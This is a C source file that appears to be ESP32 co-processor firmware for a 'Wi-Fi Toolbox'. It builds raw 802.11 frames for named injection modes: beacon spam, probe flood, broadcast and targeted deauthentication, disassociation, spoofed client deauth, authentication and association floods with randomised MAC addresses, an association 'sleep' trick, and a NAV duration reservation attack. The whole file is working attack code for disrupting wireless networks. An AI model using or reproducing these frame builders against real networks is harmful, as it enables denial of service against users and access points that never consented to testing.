/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * Wi-Fi Toolbox — raw 802.11 frame builders (co-processor side).
 *
 * Byte-for-byte port of the Tactility implementations. Where the original used
 * a C++ lambda-array literal for the broadcast address this uses a file-scope
 * const; the emitted bytes are identical. Sequence numbers advance through one
 * shared 12-bit counter exactly as the original's nextSeqControl() does, so a
 * golden-byte comparison against the original must call the builders in the
 * same order.
 */

#include <string.h>

#include "esp_random.h"
#include "wifi_toolbox_frames.h"

static const uint8_t k_broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

/* fragment(4) | sequence(12), shared by every builder that emits a sequence
 * control field. */
static uint16_t next_seq_control(void)
{
    static uint16_t s_seq = 0;

    s_seq = (uint16_t)((s_seq + 1) & 0x0FFF);
    return (uint16_t)(s_seq << 4);
}

static size_t emit_rate_tail(uint8_t *out, size_t i)
{
    out[i++] = 0x01;
    out[i++] = 0x04;
    out[i++] = 0x82;
    out[i++] = 0x84;
    out[i++] = 0x8b;
    out[i++] = 0x96;
    return i;
}

/* An SSID longer than the element can express is a caller bug, not something to
 * truncate silently: refuse so the failure is visible. */
static bool ssid_is_valid(const char *ssid, size_t len)
{
    if (ssid == NULL) {
        return (len == 0);
    }
    return (len <= WIFI_TOOLBOX_SSID_MAX);
}

size_t wifi_toolbox_build_beacon(uint8_t *out, const char *ssid, size_t ssid_len, const uint8_t bssid[6])
{
    if ((out == NULL) || (bssid == NULL) || !ssid_is_valid(ssid, ssid_len)) {
        return 0;
    }

    size_t i = 0;
    out[i++] = 0x80; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    memcpy(out + i, k_broadcast, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    out[i++] = 0x00; out[i++] = 0x00;          /* sequence control: none */
    memset(out + i, 0, 8); i += 8;             /* timestamp */
    out[i++] = 0x64; out[i++] = 0x00;          /* beacon interval */
    out[i++] = 0x01; out[i++] = 0x00;          /* capability: ESS */
    out[i++] = 0x00; out[i++] = (uint8_t)ssid_len;
    if (ssid_len > 0) {
        memcpy(out + i, ssid, ssid_len);
        i += ssid_len;
    }
    i = emit_rate_tail(out, i);
    return i;
}

size_t wifi_toolbox_build_probe_request(uint8_t *out, const char *ssid, size_t ssid_len, const uint8_t src[6])
{
    if ((out == NULL) || (src == NULL) || !ssid_is_valid(ssid, ssid_len)) {
        return 0;
    }

    size_t i = 0;
    out[i++] = 0x40; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    memcpy(out + i, k_broadcast, 6); i += 6;
    memcpy(out + i, src, 6); i += 6;
    memcpy(out + i, k_broadcast, 6); i += 6;
    out[i++] = 0x00; out[i++] = 0x00;          /* sequence control: none */
    out[i++] = 0x00; out[i++] = (uint8_t)ssid_len;
    if (ssid_len > 0) {
        memcpy(out + i, ssid, ssid_len);
        i += ssid_len;
    }
    i = emit_rate_tail(out, i);
    return i;
}

size_t wifi_toolbox_build_probe_response(uint8_t *out, const uint8_t bssid[6], const char *ssid, size_t ssid_len)
{
    if ((out == NULL) || (bssid == NULL) || !ssid_is_valid(ssid, ssid_len)) {
        return 0;
    }

    const uint16_t sc = next_seq_control();
    size_t i = 0;
    out[i++] = 0x50; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    memcpy(out + i, k_broadcast, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    out[i++] = (uint8_t)(sc & 0xff);
    out[i++] = (uint8_t)((sc >> 8) & 0xff);
    memset(out + i, 0, 8); i += 8;             /* timestamp */
    out[i++] = 0x64; out[i++] = 0x00;          /* beacon interval */
    out[i++] = 0x01; out[i++] = 0x00;          /* capability: ESS */
    out[i++] = 0x00; out[i++] = (uint8_t)ssid_len;
    if (ssid_len > 0) {
        memcpy(out + i, ssid, ssid_len);
        i += ssid_len;
    }
    i = emit_rate_tail(out, i);
    return i;
}

size_t wifi_toolbox_build_deauth(uint8_t *out, const uint8_t dest[6], const uint8_t bssid[6], bool bcast)
{
    if ((out == NULL) || (bssid == NULL) || (!bcast && (dest == NULL))) {
        return 0;
    }

    /* The original keeps its own counter here (s_deauthSeq) rather than using
     * nextSeqControl(); reproduce that so the emitted sequence numbers match. */
    static uint16_t s_deauth_seq = 0;
    s_deauth_seq = (uint16_t)((s_deauth_seq + 1) & 0x0FFF);
    const uint16_t seq = (uint16_t)(s_deauth_seq << 4);

    size_t i = 0;
    out[i++] = 0xC0; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    if (bcast) {
        memcpy(out + i, k_broadcast, 6);
    } else {
        memcpy(out + i, dest, 6);
    }
    i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    out[i++] = (uint8_t)(seq & 0xff);
    out[i++] = (uint8_t)((seq >> 8) & 0xff);
    out[i++] = 0x07; out[i++] = 0x00;
    return i;
}

size_t wifi_toolbox_build_disassoc(uint8_t *out, const uint8_t dest[6], const uint8_t bssid[6], bool bcast)
{
    const size_t len = wifi_toolbox_build_deauth(out, dest, bssid, bcast);

    if (len > 0) {
        out[0] = 0xA0;
    }
    return len;
}

size_t wifi_toolbox_build_auth(uint8_t *out, const uint8_t client[6], const uint8_t bssid[6])
{
    if ((out == NULL) || (client == NULL) || (bssid == NULL)) {
        return 0;
    }

    const uint16_t sc = next_seq_control();
    size_t i = 0;
    out[i++] = 0xB0; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    memcpy(out + i, bssid, 6); i += 6;         /* addr1: the AP */
    memcpy(out + i, client, 6); i += 6;        /* addr2: the station */
    memcpy(out + i, bssid, 6); i += 6;         /* addr3: BSSID */
    out[i++] = (uint8_t)(sc & 0xff);
    out[i++] = (uint8_t)((sc >> 8) & 0xff);
    out[i++] = 0x00; out[i++] = 0x00;          /* open system */
    out[i++] = 0x01; out[i++] = 0x00;          /* authentication sequence 1 */
    out[i++] = 0x00; out[i++] = 0x00;          /* status: success */
    return i;
}

size_t wifi_toolbox_build_assoc_request(uint8_t *out, const uint8_t client[6], const uint8_t bssid[6],
                                        const char *ssid, size_t ssid_len, uint16_t listen_interval)
{
    if ((out == NULL) || (client == NULL) || (bssid == NULL) || !ssid_is_valid(ssid, ssid_len)) {
        return 0;
    }

    const uint16_t sc = next_seq_control();
    size_t i = 0;
    out[i++] = 0x00; out[i++] = 0x00;          /* association request */
    out[i++] = 0x00; out[i++] = 0x00;
    memcpy(out + i, bssid, 6); i += 6;
    memcpy(out + i, client, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    out[i++] = (uint8_t)(sc & 0xff);
    out[i++] = (uint8_t)((sc >> 8) & 0xff);
    out[i++] = 0x01; out[i++] = 0x00;          /* capability: ESS */
    out[i++] = (uint8_t)(listen_interval & 0xff);
    out[i++] = (uint8_t)((listen_interval >> 8) & 0xff);
    out[i++] = 0x00; out[i++] = (uint8_t)ssid_len;
    if (ssid_len > 0) {
        memcpy(out + i, ssid, ssid_len);
        i += ssid_len;
    }
    i = emit_rate_tail(out, i);
    return i;
}

size_t wifi_toolbox_build_client_deauth(uint8_t *out, const uint8_t client[6], const uint8_t bssid[6])
{
    if ((out == NULL) || (client == NULL) || (bssid == NULL)) {
        return 0;
    }

    const uint16_t sc = next_seq_control();
    size_t i = 0;
    out[i++] = 0xC0; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    memcpy(out + i, bssid, 6); i += 6;         /* addr1: the AP */
    memcpy(out + i, client, 6); i += 6;        /* addr2: claims to be the station */
    memcpy(out + i, bssid, 6); i += 6;         /* addr3: BSSID */
    out[i++] = (uint8_t)(sc & 0xff);
    out[i++] = (uint8_t)((sc >> 8) & 0xff);
    out[i++] = 0x07; out[i++] = 0x00;          /* reason: class 3 from nonassociated */
    return i;
}

size_t wifi_toolbox_build_nav(uint8_t *out, const uint8_t bssid[6], uint16_t duration)
{
    if ((out == NULL) || (bssid == NULL)) {
        return 0;
    }

    const uint16_t sc = next_seq_control();
    size_t i = 0;
    out[i++] = 0x48; out[i++] = 0x00;          /* data, null function */
    out[i++] = (uint8_t)(duration & 0xff);
    out[i++] = (uint8_t)((duration >> 8) & 0xff);
    memcpy(out + i, bssid, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    memcpy(out + i, bssid, 6); i += 6;
    out[i++] = (uint8_t)(sc & 0xff);
    out[i++] = (uint8_t)((sc >> 8) & 0xff);
    return i;
}

void wifi_toolbox_randomise_mac(uint8_t mac[6])
{
    if (mac == NULL) {
        return;
    }

    const uint32_t r = esp_random();
    mac[0] = 0x02;                             /* locally administered, unicast */
    mac[1] = (uint8_t)(r >> 24);
    mac[2] = (uint8_t)(r >> 16);
    mac[3] = (uint8_t)(r >> 8);
    mac[4] = (uint8_t)(r);
    mac[5] = (uint8_t)(esp_random());
}

bool wifi_toolbox_mode_needs_client(wifi_toolbox_inject_mode_t mode)
{
    switch (mode) {
    case WIFI_TOOLBOX_INJECT_DEAUTH_BURST:
    case WIFI_TOOLBOX_INJECT_CLIENT_DEAUTH:
        return true;
    default:
        return false;
    }
}

bool wifi_toolbox_mode_needs_ssid(wifi_toolbox_inject_mode_t mode)
{
    switch (mode) {
    case WIFI_TOOLBOX_INJECT_BEACON_SPAM:
    case WIFI_TOOLBOX_INJECT_PROBE_FLOOD:
    case WIFI_TOOLBOX_INJECT_ASSOC_FLOOD:
    case WIFI_TOOLBOX_INJECT_ASSOC_SLEEP:
        return true;
    default:
        return false;
    }
}

const char *wifi_toolbox_inject_mode_name(wifi_toolbox_inject_mode_t mode)
{
    switch (mode) {
    case WIFI_TOOLBOX_INJECT_BEACON_SPAM:   return "Beacon spam";
    case WIFI_TOOLBOX_INJECT_PROBE_FLOOD:   return "Probe flood";
    case WIFI_TOOLBOX_INJECT_DEAUTH_BURST:  return "Deauth burst";
    case WIFI_TOOLBOX_INJECT_AUTH_FLOOD:    return "Auth flood";
    case WIFI_TOOLBOX_INJECT_ASSOC_FLOOD:   return "Assoc flood";
    case WIFI_TOOLBOX_INJECT_ASSOC_SLEEP:   return "Assoc sleep";
    case WIFI_TOOLBOX_INJECT_DISASSOC:      return "Disassoc";
    case WIFI_TOOLBOX_INJECT_CLIENT_DEAUTH: return "Client->AP deauth";
    case WIFI_TOOLBOX_INJECT_NAV_DURATION:  return "NAV/Duration";
    default:                                return "unknown";
    }
}

size_t wifi_toolbox_build_for_mode(uint8_t *out, wifi_toolbox_inject_mode_t mode,
                                   wifi_toolbox_frame_params_t *params)
{
    if ((out == NULL) || (params == NULL) || (mode >= WIFI_TOOLBOX_INJECT_MODE_MAX)) {
        return 0;
    }

    if (wifi_toolbox_mode_needs_ssid(mode) && !ssid_is_valid(params->ssid, params->ssid_len)) {
        return 0;
    }

    /* Modes that flood with a fresh identity per frame randomise the station
     * address, as the original does; the targeted modes use the caller's. */
    uint8_t station[6];
    memcpy(station, params->client, 6);
    switch (mode) {
    case WIFI_TOOLBOX_INJECT_BEACON_SPAM:
    case WIFI_TOOLBOX_INJECT_PROBE_FLOOD:
    case WIFI_TOOLBOX_INJECT_AUTH_FLOOD:
    case WIFI_TOOLBOX_INJECT_ASSOC_FLOOD:
    case WIFI_TOOLBOX_INJECT_ASSOC_SLEEP:
    case WIFI_TOOLBOX_INJECT_DISASSOC:
        wifi_toolbox_randomise_mac(station);
        break;
    default:
        break;
    }

    switch (mode) {
    case WIFI_TOOLBOX_INJECT_BEACON_SPAM:
    {
        /* A distinct BSSID per beacon, so each frame looks like another AP. */
        uint8_t bssid[6];
        wifi_toolbox_randomise_mac(bssid);
        return wifi_toolbox_build_beacon(out, params->ssid, params->ssid_len, bssid);
    }
    case WIFI_TOOLBOX_INJECT_PROBE_FLOOD:
        return wifi_toolbox_build_probe_request(out, params->ssid, params->ssid_len, station);
    case WIFI_TOOLBOX_INJECT_DEAUTH_BURST:
    {
        const bool bcast = (params->client[0] == 0 && params->client[1] == 0 &&
                            params->client[2] == 0 && params->client[3] == 0 &&
                            params->client[4] == 0 && params->client[5] == 0);
        return wifi_toolbox_build_deauth(out, params->client, params->bssid, bcast);
    }
    case WIFI_TOOLBOX_INJECT_AUTH_FLOOD:
        return wifi_toolbox_build_auth(out, station, params->bssid);
    case WIFI_TOOLBOX_INJECT_ASSOC_FLOOD:
        return wifi_toolbox_build_assoc_request(out, station, params->bssid, params->ssid, params->ssid_len, 10);
    case WIFI_TOOLBOX_INJECT_ASSOC_SLEEP:
    {
        /* The listen interval is the whole point of this mode: a large value
         * tells the AP the station will sleep for a long time, so it buffers
         * for it and treats it as present but unreachable. */
        uint16_t li = params->listen_interval;
        if (li == 0) {
            li = 0xFFFF;
        }
        return wifi_toolbox_build_assoc_request(out, station, params->bssid, params->ssid, params->ssid_len, li);
    }
    case WIFI_TOOLBOX_INJECT_DISASSOC:
        return wifi_toolbox_build_disassoc(out, params->client, params->bssid, true);
    case WIFI_TOOLBOX_INJECT_CLIENT_DEAUTH:
        return wifi_toolbox_build_client_deauth(out, params->client, params->bssid);
    case WIFI_TOOLBOX_INJECT_NAV_DURATION:
    {
        const uint16_t dur = (params->duration != 0) ? params->duration : 0x8000;
        return wifi_toolbox_build_nav(out, params->bssid, dur);
    }
    default:
        return 0;
    }
}
